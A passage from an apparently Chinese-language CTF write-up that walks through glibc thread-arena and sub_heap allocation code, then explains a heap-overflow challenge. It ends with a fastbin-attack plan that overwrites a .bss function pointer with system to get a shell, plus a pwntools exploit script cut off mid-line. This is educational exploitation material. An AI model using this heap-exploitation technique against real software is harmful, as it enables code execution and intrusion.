class="code"><pre><span class="line"><span class="keyword">static</span> mstate</span><br><span class="line">_int_new_arena (<span class="keyword">size_t</span> size)</span><br><span class="line">&#123;</span><br><span class="line">  mstate a;</span><br><span class="line">  heap_info *h;</span><br><span class="line">  <span class="keyword">char</span> *ptr;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> misalign;</span><br><span class="line"></span><br><span class="line">  h = new_heap (size + (<span class="keyword">sizeof</span> (*h) + <span class="keyword">sizeof</span> (*a) + MALLOC_ALIGNMENT),</span><br><span class="line">                mp_.top_pad);</span><br><span class="line">  <span class="keyword">if</span> (!h)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Maybe size is too large to fit in a single heap.  So, just try</span></span><br><span class="line"><span class="comment">         to create a minimally-sized arena and let _int_malloc() attempt</span></span><br><span class="line"><span class="comment">         to deal with the large request via mmap_chunk().  */</span></span><br><span class="line">      h = new_heap (<span class="keyword">sizeof</span> (*h) + <span class="keyword">sizeof</span> (*a) + MALLOC_ALIGNMENT, mp_.top_pad);</span><br><span class="line">      <span class="keyword">if</span> (!h)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  a = h-&gt;ar_ptr = (mstate) (h + <span class="number">1</span>);</span><br><span class="line">  malloc_init_state (a);</span><br><span class="line">  a-&gt;attached_threads = <span class="number">1</span>;</span><br><span class="line">  <span class="comment">/*a-&gt;next = NULL;*/</span></span><br><span class="line">  a-&gt;system_mem = a-&gt;max_system_mem = h-&gt;size;</span><br><span class="line">  arena_mem += h-&gt;size;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Set up the top chunk, with proper alignment. */</span></span><br><span class="line">  ptr = (<span class="keyword">char</span> *) (a + <span class="number">1</span>);</span><br><span class="line">  misalign = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunk2mem (ptr) &amp; MALLOC_ALIGN_MASK;</span><br><span class="line">  <span class="keyword">if</span> (misalign &gt; <span class="number">0</span>)</span><br><span class="line">    ptr += MALLOC_ALIGNMENT - misalign;</span><br><span class="line">  top (a) = (mchunkptr) ptr;</span><br><span class="line">  set_head (top (a), (((<span class="keyword">char</span> *) h + h-&gt;size) - ptr) | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">  LIBC_PROBE (memory_arena_new, <span class="number">2</span>, a, size);</span><br><span class="line">  mstate replaced_arena = thread_arena;</span><br><span class="line">  thread_arena = a;</span><br><span class="line">  mutex_init (&amp;a-&gt;mutex);</span><br><span class="line"></span><br><span class="line">  (<span class="keyword">void</span>) mutex_lock (&amp;list_lock);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Add the new arena to the global list.  */</span></span><br><span class="line">  a-&gt;next = main_arena.next;</span><br><span class="line">  <span class="comment">/* <span class="doctag">FIXME:</span> The barrier is an attempt to synchronize with read access</span></span><br><span class="line"><span class="comment">     in reused_arena, which does not acquire list_lock while</span></span><br><span class="line"><span class="comment">     traversing the list.  */</span></span><br><span class="line">  atomic_write_barrier ();</span><br><span class="line">  main_arena.next = a;</span><br><span class="line"></span><br><span class="line">  (<span class="keyword">void</span>) mutex_unlock (&amp;list_lock);</span><br><span class="line"></span><br><span class="line">  (<span class="keyword">void</span>) mutex_lock (&amp;free_list_lock);</span><br><span class="line">  detach_arena (replaced_arena);</span><br><span class="line">  (<span class="keyword">void</span>) mutex_unlock (&amp;free_list_lock);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Lock this arena.  NB: Another thread may have been attached to</span></span><br><span class="line"><span class="comment">     this arena because the arena is now accessible from the</span></span><br><span class="line"><span class="comment">     main_arena.next list and could have been picked by reused_arena.</span></span><br><span class="line"><span class="comment">     This can only happen for the last arena created (before the arena</span></span><br><span class="line"><span class="comment">     limit is reached).  At this point, some arena has to be attached</span></span><br><span class="line"><span class="comment">     to two threads.  We could acquire the arena lock before list_lock</span></span><br><span class="line"><span class="comment">     to make it less likely that reused_arena picks this new arena,</span></span><br><span class="line"><span class="comment">     but this could result in a deadlock with ptmalloc_lock_all.  */</span></span><br><span class="line"></span><br><span class="line">  (<span class="keyword">void</span>) mutex_lock (&amp;a-&gt;mutex);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后再追踪一下new_heap这个申请内存的函数。全局变量 aligned_heap_area 是上一次调用 mmap 分配内存的结束虚拟地址，并已经按照 HEAP_MAX_SIZE 大小对齐。如果 aligned_heap_area 不为空，尝试从上次映射结束地址开始映射大小为 HEAP_MAX_SIZE 的内存块， 由于全局变量 aligned_heap_area 没有锁保护，可能存在多个线程同时 mmap()函数从 aligned_heap_area 开始映射新的虚拟内存块，操作系统会保证只会有一个线程会成功，其它在同一地址映射新虚拟内存块都会失败。 无论映射是否成功，都将全局变量 aligned_heap_area 设置为 NULL。如果映射成功，但返回的虚拟地址不是按HEAP_MAX_SIZE 大小对齐的，取消该区域的映射，映射失败。 </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> heap_info *</span><br><span class="line">internal_function</span><br><span class="line">new_heap (<span class="keyword">size_t</span> size, <span class="keyword">size_t</span> top_pad)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">size_t</span> pagesize = GLRO (dl_pagesize);</span><br><span class="line">  <span class="keyword">char</span> *p1, *p2;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> ul;</span><br><span class="line">  heap_info *h;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (size + top_pad &lt; HEAP_MIN_SIZE)</span><br><span class="line">    size = HEAP_MIN_SIZE;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (size + top_pad &lt;= HEAP_MAX_SIZE)</span><br><span class="line">    size += top_pad;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (size &gt; HEAP_MAX_SIZE)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    size = HEAP_MAX_SIZE;</span><br><span class="line">  size = ALIGN_UP (size, pagesize);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* A memory region aligned to a multiple of HEAP_MAX_SIZE is needed.</span></span><br><span class="line"><span class="comment">     No swap space needs to be reserved for the following large</span></span><br><span class="line"><span class="comment">     mapping (on Linux, this is the case for all non-writable mappings</span></span><br><span class="line"><span class="comment">     anyway). */</span></span><br><span class="line">  p2 = MAP_FAILED;</span><br><span class="line">  <span class="keyword">if</span> (aligned_heap_area)</span><br><span class="line">    &#123;</span><br><span class="line">      p2 = (<span class="keyword">char</span> *) MMAP (aligned_heap_area, HEAP_MAX_SIZE, PROT_NONE,</span><br><span class="line">                          MAP_NORESERVE);</span><br><span class="line">      aligned_heap_area = <span class="literal">NULL</span>;</span><br><span class="line">      <span class="keyword">if</span> (p2 != MAP_FAILED &amp;&amp; ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) p2 &amp; (HEAP_MAX_SIZE - <span class="number">1</span>)))</span><br><span class="line">        &#123;</span><br><span class="line">          __munmap (p2, HEAP_MAX_SIZE);</span><br><span class="line">          p2 = MAP_FAILED;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (p2 == MAP_FAILED)</span><br><span class="line">    &#123;</span><br><span class="line">      p1 = (<span class="keyword">char</span> *) MMAP (<span class="number">0</span>, HEAP_MAX_SIZE &lt;&lt; <span class="number">1</span>, PROT_NONE, MAP_NORESERVE);</span><br><span class="line">      <span class="keyword">if</span> (p1 != MAP_FAILED)</span><br><span class="line">        &#123;</span><br><span class="line">          p2 = (<span class="keyword">char</span> *) (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) p1 + (HEAP_MAX_SIZE - <span class="number">1</span>))</span><br><span class="line">                         &amp; ~(HEAP_MAX_SIZE - <span class="number">1</span>));</span><br><span class="line">          ul = p2 - p1;</span><br><span class="line">          <span class="keyword">if</span> (ul)</span><br><span class="line">            __munmap (p1, ul);</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            aligned_heap_area = p2 + HEAP_MAX_SIZE;</span><br><span class="line">          __munmap (p2 + HEAP_MAX_SIZE, HEAP_MAX_SIZE - ul);</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">/* Try to take the chance that an allocation of only HEAP_MAX_SIZE</span></span><br><span class="line"><span class="comment">             is already aligned. */</span></span><br><span class="line">          p2 = (<span class="keyword">char</span> *) MMAP (<span class="number">0</span>, HEAP_MAX_SIZE, PROT_NONE, MAP_NORESERVE);</span><br><span class="line">          <span class="keyword">if</span> (p2 == MAP_FAILED)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) p2 &amp; (HEAP_MAX_SIZE - <span class="number">1</span>))</span><br><span class="line">            &#123;</span><br><span class="line">              __munmap (p2, HEAP_MAX_SIZE);</span><br><span class="line">              <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (__mprotect (p2, size, PROT_READ | PROT_WRITE) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      __munmap (p2, HEAP_MAX_SIZE);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  h = (heap_info *) p2;</span><br><span class="line">  h-&gt;size = size;</span><br><span class="line">  h-&gt;mprotect_size = size;</span><br><span class="line">  LIBC_PROBE (memory_heap_new, <span class="number">2</span>, h, h-&gt;size);</span><br><span class="line">  <span class="keyword">return</span> h;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li><p>分配区的补充</p><p>在malloc获取较大内存空间，导致top用尽时，根据需求会扩大top块的容量。而对于非主分配区，扩大top在一定情况下是获得连续内存的，这就显示出了sub_heap的用途。跟踪一下int_malloc函数，在malloc函数的最后，有这样的代码，当申请的内存，top头无法满足时，会对fastbin进行释放操作，当仍无法满足时，会调用sysmalloc进行补充。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">     ...</span><br><span class="line">     <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">        &#123;</span><br><span class="line">          remainder_size = size - nb;</span><br><span class="line">          remainder = chunk_at_offset (victim, nb);</span><br><span class="line">          av-&gt;top = remainder;</span><br><span class="line">          set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                    (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">          set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line">          <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* When we are using atomic ops to free fast chunks we can get</span></span><br><span class="line"><span class="comment">         here for all block sizes.  */</span></span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (have_fastchunks (av))</span><br><span class="line">        &#123;</span><br><span class="line">          malloc_consolidate (av);</span><br><span class="line">          <span class="comment">/* restore original bin index */</span></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">            idx = smallbin_index (nb);</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            idx = largebin_index (nb);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         Otherwise, relay to handle system-dependent cases</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">          <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">            alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>追踪sysmalloc代码，代码过长，截取非主分配区部分。当申请的堆小于mmap直接分配阈值，并且分配区是非主分配区时，首先尝试延长原有的heap长度（连续分配）；当长度不满足需求时，会重新分配一块sub_heap，并设置heap_info值，也就是利用mmap随机在内存中申请一块内存，这块内存位于刚刚分配的低地址位置。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> *</span><br><span class="line">sysmalloc (INTERNAL_SIZE_T nb, mstate av)</span><br><span class="line">&#123;</span><br><span class="line">  mchunkptr old_top;              <span class="comment">/* incoming value of av-&gt;top */</span></span><br><span class="line">  INTERNAL_SIZE_T old_size;       <span class="comment">/* its size */</span></span><br><span class="line">  <span class="keyword">char</span> *old_end;                  <span class="comment">/* its end address */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">long</span> size;                      <span class="comment">/* arg to first MORECORE or mmap call */</span></span><br><span class="line">  <span class="keyword">char</span> *brk;                      <span class="comment">/* return value from MORECORE */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">long</span> correction;                <span class="comment">/* arg to 2nd MORECORE call */</span></span><br><span class="line">  <span class="keyword">char</span> *snd_brk;                  <span class="comment">/* 2nd return val */</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T front_misalign; <span class="comment">/* unusable bytes at front of new space */</span></span><br><span class="line">  INTERNAL_SIZE_T end_misalign;   <span class="comment">/* partial page left at end of new space */</span></span><br><span class="line">  <span class="keyword">char</span> *aligned_brk;              <span class="comment">/* aligned offset into brk */</span></span><br><span class="line"></span><br><span class="line">  mchunkptr p;                    <span class="comment">/* the allocated/returned chunk */</span></span><br><span class="line">  mchunkptr remainder;            <span class="comment">/* remainder from allocation */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> remainder_size;   <span class="comment">/* its size */</span></span><br></pre></td></tr></table></figure><p>  size_t pagesize = GLRO (dl_pagesize);<br>  bool tried_mmap = false;</p></li></ol></li></ol></li></ol><pre><code>     /*        If have mmap, and the request size meets the mmap threshold, and        the system supports mmap, and there are few enough currently        allocated mmapped regions, try to directly map this request        rather than expanding top.      */     if (av == NULL         || ((unsigned long) (nb) &gt;= (unsigned long) (mp_.mmap_threshold)         &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max)))       {         ...         }     if (av != &amp;main_arena)       {         heap_info *old_heap, *heap;         size_t old_heap_size;         /* First try to extend the current heap. */         old_heap = heap_for_ptr (old_top);         old_heap_size = old_heap-&gt;size;         if ((long) (MINSIZE + nb - old_size) &gt; 0             &amp;&amp; grow_heap (old_heap, MINSIZE + nb - old_size) == 0)           {             av-&gt;system_mem += old_heap-&gt;size - old_heap_size;             arena_mem += old_heap-&gt;size - old_heap_size;             set_head (old_top, (((char *) old_heap + old_heap-&gt;size) - (char *) old_top)                       | PREV_INUSE);           }         else if ((heap = new_heap (nb + (MINSIZE + sizeof (*heap)), mp_.top_pad)))           {             /* Use a newly allocated heap.  */             heap-&gt;ar_ptr = av;             heap-&gt;prev = old_heap;             av-&gt;system_mem += heap-&gt;size;             arena_mem += heap-&gt;size;             /* Set up the new top.  */             top (av) = chunk_at_offset (heap, sizeof (*heap));             set_head (top (av), (heap-&gt;size - sizeof (*heap)) | PREV_INUSE);             /* Setup fencepost and free the old top chunk with a multiple of                MALLOC_ALIGNMENT in size. */             /* The fencepost takes at least MINSIZE bytes, because it might                become the top chunk again later.  Note that a footer is set                up, too, although the chunk is marked in use. */             old_size = (old_size - MINSIZE) &amp; ~MALLOC_ALIGN_MASK;             set_head (chunk_at_offset (old_top, old_size + 2 * SIZE_SZ), 0 | PREV_INUSE);             if (old_size &gt;= MINSIZE)               {                 set_head (chunk_at_offset (old_top, old_size), (2 * SIZE_SZ) | PREV_INUSE);                 set_foot (chunk_at_offset (old_top, old_size), (2 * SIZE_SZ));                 set_head (old_top, old_size | PREV_INUSE | NON_MAIN_ARENA);                 _int_free (av, old_top, 1);               }             else               {                 set_head (old_top, (old_size + 2 * SIZE_SZ) | PREV_INUSE);                 set_foot (old_top, (old_size + 2 * SIZE_SZ));               }           }         else if (!tried_mmap)           /* We can at least try to use to mmap memory.  */           goto try_mmap;       }     else     /* av == main_arena */       {       ...       }   }   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><span class="line">    </span><br><span class="line">   至此，线程堆的初始化、扩展、sub_heap生成全部完成。</span><br><span class="line">    </span><br><span class="line">   ​</span><br><span class="line">    </span><br><span class="line">## 题目分析</span><br><span class="line">    </span><br><span class="line">题目逻辑很简单，主函数什么都没有，只开启了一个线程。</span><br><span class="line">    </span><br><span class="line">![](/img/n1ctf2018/2-1.png)</span><br><span class="line">    </span><br><span class="line">在线程中，实现了用户输入任意大小的堆块、个数进行填充，并且可以对最后一个堆块赋值。</span><br><span class="line">    </span><br><span class="line">![](/img/n1ctf2018/2-3.png)</span><br><span class="line">    </span><br><span class="line">![](/img/n1ctf2018/2-2.png)</span><br><span class="line">    </span><br><span class="line">## 漏洞利用</span><br><span class="line">    </span><br><span class="line">漏洞存在于赋值函数中，是一个堆溢出函数，可以溢出和堆块大小等长的堆块。</span><br><span class="line">    </span><br><span class="line">![](/img/n1ctf2018/2-4.png)</span><br><span class="line">    </span><br><span class="line">该程序不存在地址泄露，并且system的地址也已经给出。</span><br><span class="line">    </span><br><span class="line">利用方法是利用上述线程堆块分配的知识。</span><br><span class="line">    </span><br><span class="line">1. 首先将线程第一次分配的非主分配区填充满</span><br><span class="line">    </span><br><span class="line">2. 再次申请时，线程只能申请一个新的sub_heap，此时的sub_heap地址位于第一次申请的sub_heap低地址位置。</span><br><span class="line">    </span><br><span class="line">3. 再次将该sub_heap填充满，在最后一次填充时进行复制，由于存在堆溢出，则可以溢出覆盖非主分配区的malloc_state结构体（thread arena），此时的利用和覆盖了main_arena的利用方法一致。</span><br><span class="line">    </span><br><span class="line">4. 选择fastbin attack的方法进行攻击，将fastbin劫持到bss段上去，因为bss段上有一个函数指针，会在赋值后调用，将这个函数赋值为system，并将堆块起始覆盖为&apos;/bin/sh&apos;即可获得shell。</span><br><span class="line">    </span><br><span class="line">   **hint：**</span><br><span class="line">    </span><br><span class="line">   1. 一定要劫持大小为0x70的fastbin链，因为可以利用bss段起始位置的STDIO file指针。</span><br><span class="line">    </span><br><span class="line">     ，与第一题的利用相同，都是0x7f。</span><br><span class="line">    </span><br><span class="line">   2. 无法劫持top值达到任意分配，原因是无法过int_malloc最后的检测，感兴趣的同学可以踩踩这个坑。</span><br><span class="line">    </span><br><span class="line">   ​</span><br><span class="line">    </span><br><span class="line">## 解题脚本</span><br><span class="line">    </span><br><span class="line">```python</span><br><span class="line">from pwn import *</span><br><span class="line">import time</span><br><span class="line">debug = 1</span><br><span class="line">elf = ELF(&apos;./null&apos;)</span><br><span class="line">if debug:</span><br><span class="line">p = process(&apos;./null&apos;)</span><br><span class="line">libc = ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">else:</span><br><span class="line">exit(0)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(&apos;Enter secret password:&apos;)</span><br><span class="line">p.send(&apos;i\&apos;m ready for challenge\n&apos;)</span><br><span class="line">time.sleep(3)</span><br><span class="line">    </span><br><span class="line">for i in range(0,3):</span><br><span class="line">p.recvuntil(&apos;Action:&apos;)</span><br><span class="line">p.sendline(&apos;1&apos;)</span><br><span class="line">p.recvuntil(&apos;Size:&apos;)</span><br><span class="line">p.sendline(str(0x4000))</span><br><span class="line">p.recvuntil(&apos;blocks:&apos;)</span><br><span class="line">p.sendline(str(1000-1))</span><br><span class="line">p.recvuntil(&apos;(0/1):&apos;)</span><br><span class="line">p.sendline(&apos;0&apos;)</span><br><span class="line">    </span><br><span class="line">p.recvuntil(&apos;Action:&apos;)</span><br><span class="line">p.sendline(&apos;1&apos;)</span><br><span class="line">p.recvuntil(&apos;Size:&apos;)</span><br><span class="line">p.sendline(str(0x4000))</span><br><span class="line">p.recvuntil(&apos;blocks:&apos;)</span><br><span class="line">p.sendline(str(1000-1))</span><br><span class="line">p.recvuntil(&apos;(0/1):&apos;)</span><br><span class="line">p.sendline(&apos;0&apos;)</span><br><span class="line">    </span><br><span class="line">p.recvuntil(&apos;Action:&apos;)</span><br><span class="line">p.sendline(&apos;1&apos;)</span><br><span class="line">p.recvuntil(&apos;Size:&apos;)</span><br><span class="line">p.sendline(str(0x4000))</span><br><span class="line">p.recvuntil(&apos;blocks:&apos;)</span><br><span class="line">p.sendline(str(1000))</span><br><span class="line">p.recvuntil(&apos;(0/1):&apos;)</span><br><span class="line">p.sendline(&apos;0&apos;)</span><br><span class="line">    </span><br><span class="line">p.recvuntil(&apos;Action:&apos;)</span><br><span class="line">p.sendline(&apos;1&apos;)</span><br><span class="line">p.recvuntil(&apos;Size:&apos;)</span><br><span class="line">p.sendline(str(0x4000))</span><br><span class="line">p.recvuntil(&apos;blocks:&apos;)</span><br><span class="line">p.sendline(str(1000-1))</span><br><span class="line">p.recvuntil(&apos;(0/1):&apos;)</span><br><span class="line">p.sendline(&apos;0&apos;)</span><br><span class="line">    </span><br><span class="line">p.recvuntil(&apos;Action:&apos;)</span><br><span class="line">p.sendline(&apos;1&apos;)</span><br><span class="line">p.recvuntil(&apos;Size:&apos;)</span><br><span class="line">p.sendline(str(0x4000))</span><br><span class="line">p.recvuntil(&apos;blocks:&apos;)</span><br><span class="line">p.sendline(str(90-1))</span><br><span class="line">p.recvuntil(&apos;(0/1):&apos;)</span><br><span class="line">p.sendline(&apos;0&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(&apos;Action:&apos;)</span><br><span class="line">p.sendline(&apos;1&apos;)</span><br><span class="line">p.recvuntil(&apos;Size:&apos;)</span><br><span class="line">p.sendline(str(0x4000))</span><br><span class="line">p.recvuntil(&apos;blocks:&apos;)</span><br><span class="line">p.sendline(str(1))</span><br><span class="line">p.recvuntil(&apos;(0/1):&apos;)</span><br><span class="line">p.sendline(&apos;1&apos;)</span><br><span class="line">p.recvuntil(&apos;Input:&apos;)</span><br><span class="line">    </span><br><span class="line">p.send(&apos;/bin/sh\0&apos;+p64(0)*(2+4+2+8+3-1))</span><br><span class="line">padding = p64(0)*(0x4000/8-2-4-8-3) +p64(0)+ p64(0x11) + p64(0)*4 +p64(0) + p64(0)*5+p64(0x60201d)+ p64(0)*4 #p64(0x602028-4)</span><br><span class="line">print hex(len(padding))</span><br><span class="line">p.send(padding)</span><br><span class="line">#gdb.attach(p,&apos;info threads&apos;)</span><br><span class="line">p.recvuntil(&apos;Action:&apos;)</span><br><span class="line">p.sendline(&apos;1&apos;)</span><br><span class="line">p.recvuntil(&apos;Size:&apos;)</span><br><span class="line">p.sendline(str(0x60))</span><br><span class="line">p.recvuntil(&apos;blocks:&apos;)</span><br><span class="line">p.sendline(str(0))</span><br><span class="line">p.recvuntil(&apos;(0/1):&apos;)</span><br><span class="line">p.sendline(&apos;1&apos;)</span><br><span 